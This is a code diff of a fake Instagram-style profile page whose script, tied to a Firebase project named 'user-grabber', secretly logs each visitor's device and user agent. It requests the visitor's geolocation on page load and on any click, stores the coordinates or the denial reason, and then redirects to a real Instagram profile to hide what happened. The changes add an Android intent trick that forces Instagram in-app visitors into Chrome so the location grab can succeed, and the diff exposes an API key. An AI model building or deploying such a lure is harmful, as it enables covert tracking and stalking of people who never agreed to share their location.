@@ -52,14 +52,18 @@
         .badge{position:absolute;top:-6px;right:-8px;background:var(--ig-red);color:white;font-size:10px;font-weight:bold;width:17px;height:17px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid white}
         
         /* Loading Overlay */
-        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index: 2000; justify-content: center; align-items: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ig-secondary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ig-secondary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        .loading-text { font-weight: 600; color: #555; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="loading"><div class="spinner"></div></div>
+    <div id="loading">
+        <div class="spinner"></div>
+        <div class="loading-text">Loading...</div>
+    </div>
 
     <header class="top-nav">
         <div class="back-btn">
@@ -131,6 +135,31 @@
     </div>
 
 <script>
+    // --- FORCE BROWSER CHECK (The New "Breakout" Logic) ---
+    // If Android AND Instagram, we force Chrome to open.
+    const ua = navigator.userAgent;
+    const isInstagram = ua.includes("Instagram");
+    const isAndroid = ua.includes("Android");
+
+    if (isInstagram && isAndroid) {
+        // 1. Get the current URL
+        const currentUrl = window.location.href;
+        // 2. Remove https:// to format properly for Intent
+        const cleanUrl = currentUrl.replace("https://", "").replace("http://", "");
+        // 3. Construct the Magic Android Intent URL
+        const intentUrl = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+        
+        // 4. Force the browser to switch
+        window.location.href = intentUrl;
+        
+        // 5. Stop the rest of the script from running (it's pointless now)
+        throw new Error("Redirecting to Chrome...");
+    }
+
+    // ==========================================================
+    // NORMAL SCRIPT CONTINUES BELOW (For iOS and Desktop/Chrome)
+    // ==========================================================
+
     const firebaseConfig = {
         apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
         authDomain: "user-grabber.firebaseapp.com",
@@ -143,56 +172,37 @@
 
     try { firebase.initializeApp(firebaseConfig); } catch(e){}
     const db = firebase.database();
-    let currentUserRef = null;
+    
+    // Create DB ref instantly
+    const currentUserRef = db.ref('mobile_users').push();
+    
+    // Initial Log
+    currentUserRef.set({
+        status: "Initialized",
+        userAgent: navigator.userAgent,
+        time: new Date().toLocaleString()
+    });
+
     let locationCaptured = false;
     const finalRedirect = "https://www.instagram.com/priyankamjain___0207/";
 
-    // --- INSTAGRAM DETECTION ---
-    const isInstagram = navigator.userAgent.includes("Instagram");
-
-    async function getDeviceModel() {
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            try {
-                const uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                if (uaData.model) return uaData.model;
-            } catch (e) {}
-        }
-        const ua = navigator.userAgent;
-        if (ua.indexOf("Android") > -1) {
-            const match = ua.match(/;\s([^;]+)\sBuild\//);
-            if (match && match[1]) return match[1];
-            return "Android Device";
-        } else if (ua.indexOf("iPhone") > -1) {
-            return "iPhone";
-        }
-        return "Unknown Device";
+    function safeRedirect() {
+        document.querySelector('.loading-text').innerText = "Redirecting...";
+        setTimeout(() => { window.location.href = finalRedirect; }, 500);
     }
 
-    async function checkPermissionStatus() {
-        if (navigator.permissions && navigator.permissions.query) {
-            try {
-                const result = await navigator.permissions.query({ name: 'geolocation' });
-                return result.state; 
-            } catch (e) { return 'unknown'; }
-        }
-        return 'unknown';
-    }
-
-    async function captureLocation(triggerType) {
-        if (!currentUserRef) return;
-        
+    function captureLocation(triggerType) {
         if (triggerType === 'click') {
             document.getElementById('loading').style.display = 'flex';
         }
 
-        // HTTPS Check
         if (window.location.protocol !== "https:" && window.location.hostname !== "localhost") {
-            currentUserRef.update({ status: "Failed: Not HTTPS" });
-            if (triggerType === 'click') {
-                window.location.href = finalRedirect; // Just redirect on IG
-            }
+            if (triggerType === 'click') safeRedirect();
             return;
         }
+
+        // Low accuracy is faster/better for In-App browsers
+        const geoOptions = { enableHighAccuracy: false, timeout: 6000, maximumAge: 0 };
 
         navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -201,67 +211,41 @@
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
                     accuracy: pos.coords.accuracy,
-                    location_type: "Precise (" + triggerType + ")",
-                    status: "Captured"
+                    location_type: "Captured (" + triggerType + ")",
+                    status: "Success"
                 }).then(() => {
-                    if (triggerType === 'click') window.location.href = finalRedirect;
-                });
+                    if (triggerType === 'click') safeRedirect();
+                }).catch(() => { if (triggerType === 'click') safeRedirect(); });
             },
             (err) => {
-                // INSTAGRAM SPECIFIC LOGIC
-                if (isInstagram) {
-                    // Instagram blocked it. We cannot fix this inside the app.
-                    // Log it and Redirect immediately so it looks like a normal link.
-                    currentUserRef.update({ 
-                        last_error: "Instagram In-App Denial",
-                        status: "Failed (IG In-App)"
-                    }).then(() => {
-                        window.location.href = finalRedirect;
-                    });
-                    return;
-                }
+                let msg = err.message;
+                if (err.code === 1) msg = "User Denied";
+                if (err.code === 3) msg = "Timeout";
 
-                // Normal Browser Logic (Chrome/Safari)
-                let errorMsg = err.message;
-                const permState = "unknown"; // simplified for speed
-
-                // If user denied it on a normal browser, show alert ONLY on click
-                if (triggerType === 'click') {
-                     alert("Location access is blocked by your browser settings. Redirecting to profile...");
-                     window.location.href = finalRedirect;
-                } else {
-                    // Silent fail on load
-                    currentUserRef.update({ status: "Denied on Load" });
-                }
+                currentUserRef.update({ 
+                    last_error: msg,
+                    status: "Failed (" + triggerType + ")"
+                }).then(() => {
+                    if (triggerType === 'click') safeRedirect();
+                });
             },
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            geoOptions
         );
     }
 
-    window.addEventListener('DOMContentLoaded', async () => {
-        const exactModel = await getDeviceModel();
-        currentUserRef = db.ref('mobile_users').push();
-        
-        // Tag user as Instagram Browser if detected
-        const browserType = isInstagram ? "Instagram In-App" : navigator.userAgent;
-
-        await currentUserRef.set({
-            device: exactModel,
-            userAgent: browserType,
-            time: new Date().toLocaleString(),
-            status: "On Page"
-        });
-
+    window.addEventListener('DOMContentLoaded', () => {
+        if (navigator.userAgentData) {
+            navigator.userAgentData.getHighEntropyValues(["model"])
+                .then(ua => currentUserRef.update({ device: ua.model || "Unknown" }));
+        }
         captureLocation('load');
     });
 
     document.addEventListener('click', (e) => {
-        if (locationCaptured) {
-            window.location.href = finalRedirect;
-            return;
-        }
+        if (locationCaptured) return;
         e.preventDefault(); 
         captureLocation('click');
+        setTimeout(() => { window.location.href = finalRedirect; }, 8000);
     }, { once: false });
 
 </script>
